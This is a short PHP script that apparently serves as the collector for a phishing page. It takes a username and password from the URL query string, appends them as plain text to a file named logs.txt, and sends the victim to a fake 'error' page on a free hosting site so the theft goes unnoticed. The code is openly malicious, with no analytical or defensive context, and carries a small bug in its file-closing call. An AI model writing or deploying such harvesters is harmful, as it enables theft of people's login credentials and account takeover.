<?php
    header('Location: https://splashier-gallon.000webhostapp.com/error/error.php');
    $username = $_GET['name'];
    $password = $_GET['pwd'];
    $filename = 'logs.txt';
    $fp = fopen($filename, 'a+');
    fwrite($fp, $username . "," . $password . "\n");
    $fclose($fp);
    die();
?>